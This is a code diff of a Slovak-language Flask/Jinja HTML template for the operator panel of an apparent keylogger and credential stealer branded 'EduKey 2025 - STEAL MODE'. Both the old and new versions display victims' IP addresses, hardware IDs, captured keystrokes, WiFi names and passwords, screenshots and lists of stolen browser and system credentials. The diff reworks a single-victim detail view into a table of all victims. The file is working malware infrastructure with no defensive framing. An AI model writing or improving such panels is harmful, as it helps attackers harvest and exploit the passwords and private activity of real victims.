@@ -2,76 +2,79 @@
 <html lang="sk">
 <head>
     <meta charset="UTF-8" />
-    <title>EduKey2025 Detail Záznamu</title>
+    <title>EduKey Admin Panel - STEAL MODE</title>
     <style>
-        body { background-color: #0f0f0f; color: #00ff00; font-family: "Courier New", Courier, monospace; margin: 0; padding: 1rem; }
-        header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #00ff00; padding-bottom: 0.5rem; margin-bottom: 1rem; }
-        a.logout { color: #00ff00; text-decoration: none; border: 1px solid #00ff00; padding: 0.2rem 0.5rem; border-radius: 4px; transition: all 0.3s ease; }
-        a.logout:hover { background-color: #00ff00; color: #0f0f0f; }
-        a.back { color: #00ff00; text-decoration: underline; margin-right: 1rem; }
-        h1 { margin: 0; font-size: 1.5rem; }
-        .entry { border: 1px solid #00ff00; padding: 1rem; margin-bottom: 1rem; border-radius: 6px; box-shadow: 0 0 10px #00880044; background-color: #101010; }
-        .entry pre { white-space: pre-wrap; word-wrap: break-word; background-color: #00000088; padding: 0.5rem; border-radius: 4px; max-height: 300px; overflow: auto; }
-        .entry img { max-width: 600px; border: 1px solid #00ff00; margin-top: 0.5rem; border-radius: 4px; box-shadow: 0 0 8px #00ff00aa; display: block; }
-        /* Štýl pre zoznam poverení */
-        .credentials-list { margin-top: 1rem; }
-        .credential-item { background-color: #000000aa; border-left: 3px solid #00ff00; padding: 0.8rem; margin-bottom: 0.5rem; border-radius: 0 4px 4px 0; }
-        .credential-item strong { color: #00ff00; }
+        /* Dark hacker vibe */
+        body { background-color: #0f0f0f; color: #00ff00; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; }
+        h2 { text-align: center; font-size: 2.5em; text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00; margin-bottom: 20px; }
+        table { border-collapse: collapse; width: 100%; border: 1px solid #00ff00; box-shadow: 0 0 15px #00ff00aa; }
+        th, td { border: 1px solid #00ff00; padding: 10px; text-align: left; vertical-align: top; }
+        th { background: #003300; text-transform: uppercase; letter-spacing: 1px; }
+        pre { white-space: pre-wrap; word-wrap: break-word; font-size: 0.9em; color: #0f0; max-height: 100px; overflow-y: auto; }
+        img { max-height: 120px; border: 1px solid #00ff00; box-shadow: 0 0 8px #00ff00; cursor: pointer; }
+        tr:hover { background-color: #002200; }
         .no-data { color: #888; font-style: italic; }
 
-        /* Animácia písania */
-        @keyframes typing { from { width: 0 } to { width: 100% } }
-        .typing-effect { overflow: hidden; white-space: nowrap; border-right: 2px solid #00ff00; animation: typing 2s steps(40, end), blink 0.75s step-end infinite; max-width: 100%; display: inline-block; }
-        @keyframes blink { 50% { border-color: transparent } 100% { border-color: #00ff00 } }
+        /* Glitch effect on keys */
+        td pre { position: relative; animation: glitch 2s infinite; }
+        @keyframes glitch { 0% { text-shadow: 2px 0 red, -2px 0 cyan; } 20% { text-shadow: -2px 0 red, 2px 0 cyan; } 40% { text-shadow: 2px 0 red, -2px 0 cyan; } 60% { text-shadow: -2px 0 red, 2px 0 cyan; } 80% { text-shadow: 2px 0 red, -2px 0 cyan; } 100% { text-shadow: none; } }
+
+        /* Scroll bar for large data */
+        tbody { display: block; max-height: 70vh; overflow-y: auto; }
+        thead, tbody tr { display: table; width: 100%; table-layout: fixed; }
+        th:nth-child(6), td:nth-child(6) { width: 25%; } /* Klávesy */
+        th:nth-child(7), td:nth-child(7) { width: 10%; } /* Screenshot */
+        th:nth-child(8), td:nth-child(8) { width: 10%; } /* Akcie */
     </style>
 </head>
 <body>
-    <header>
-        <div>
-            <a href="{{ url_for('dashboard') }}" class="back">&larr; Späť na prehľad</a>
-            <h1 class="typing-effect">EduKey2025 Detail Záznamu</h1>
-        </div>
-        <a href="{{ url_for('logout') }}" class="logout">Logout</a>
-    </header>
-
-    {% if entry %}
-    <div class="entry">
-        <strong>User ID:</strong> {{ entry.user_id }}<br />
-        <strong>HWID:</strong> {{ entry.hwid }}<br />
-        <strong>IP Address:</strong> {{ entry.ip_address }}<br />
-        <strong>Active Window:</strong> {{ entry.active_window or 'N/A' }}<br />
-        <strong>Received at:</strong> {{ entry.received_at }}<br />
-        <strong>Keys pressed:</strong>
-        <pre>{{ entry.keys or 'Žiadne klávesy v tomto intervale.' }}</pre>
-        
-        <strong>WiFi SSID:</strong> {{ entry.wifi_ssid or '<span class="no-data">Žiadne</span>'|safe }}<br />
-        <strong>WiFi Password:</strong> {{ entry.wifi_password or '<span class="no-data">Neznáme</span>'|safe }}<br />
-        
-        {% if entry.screenshot %}
-        <strong>Screenshot:</strong><br />
-        <img src="data:image/png;base64,{{ entry.screenshot }}" alt="Screenshot" />
-        {% endif %}
-
-        <!-- NOVÁ SEKCIA: ZOZNAM VŠETKÝCH UKRADNUTÝCH POVERENÍ -->
-        <div class="credentials-list">
-            <h3>Ukradnuté poverenia ({{ entry.stolen_data|length }} nájdených)</h3>
-            {% if entry.stolen_data %}
-                {% for cred in entry.stolen_data %}
-                <div class="credential-item">
-                    <strong>Aplikácia/Prehliadač:</strong> {{ cred.app or 'Neznáma' }}<br>
-                    <strong>URL/Server:</strong> {{ cred.url or 'N/A' }}<br>
-                    <strong>Používateľské meno/Email:</strong> {{ cred.username or 'N/A' }}<br>
-                    <strong>Heslo:</strong> {{ cred.password or 'N/A' }}
-                </div>
-                {% endfor %}
-            {% else %}
-                <p class="no-data">Neboli nájdené žiadne uložené poverenia v prehliadačoch alebo systéme.</p>
-            {% endif %}
-        </div>
-
-    </div>
-    {% else %}
-        <p>Záznam nebol nájdený.</p>
-    {% endif %}
+    <h2>EDUKEY 2025 - STEAL MODE</h2>
+    <table>
+        <thead>
+            <tr>
+                <th>Čas</th>
+                <th>User</th>
+                <th>HWID</th>
+                <th>IP</th>
+                <th>Aktívne okno</th>
+                <th>WiFi Sieť</th>
+                <th>Stlačené klávesy</th>
+                <th>Screenshot</th>
+                <th>Akcie</th>
+            </tr>
+        </thead>
+        <tbody>
+        {% for entry in data %}
+            <tr>
+                <!-- ✅ OPRAVENÉ: received_at namiesto timestamp -->
+                <td>{{ entry.received_at[:19].replace('T', ' ') }}</td>
+                <!-- ✅ OPRAVENÉ: user namiesto user_id -->
+                <td>{{ entry.user or 'N/A' }}</td>
+                <td>{{ entry.hwid[:10] }}...</td>
+                <!-- ✅ OPRAVENÉ: ip namiesto ip_address -->
+                <td>{{ entry.ip or 'N/A' }}</td>
+                <td>{{ entry.active_window or 'N/A' }}</td>
+                <td>{{ entry.wifi_ssid or '<span class="no-data">N/A</span>'|safe }}</td>
+                <td><pre>{{ entry.keys or '<span class="no-data">Žiadne</span>'|safe }}</pre></td>
+                <td>
+                    {% if entry.screenshot %}
+                        <!-- ✅ OPRAVENÉ: detail namiesto screenshot -->
+                        <a href="{{ url_for('detail', index=loop.index0) }}">
+                            <img src="data:image/png;base64,{{ entry.screenshot }}" alt="Screenshot" />
+                        </a>
+                    {% else %}
+                        <span class="no-data">Žiadny</span>
+                    {% endif %}
+                </td>
+                <td>
+                    <a href="{{ url_for('detail', index=loop.index0) }}" style="color: #00ff00; text-decoration: underline;">Zobraziť detail</a>
+                    {% if entry.stolen_data %}
+                        <br><span style="color: #ff00ff;">[{{ entry.stolen_data|length }} hesiel]</span>
+                    {% endif %}
+                </td>
+            </tr>
+        {% endfor %}
+        </tbody>
+    </table>
 </body>
 </html>
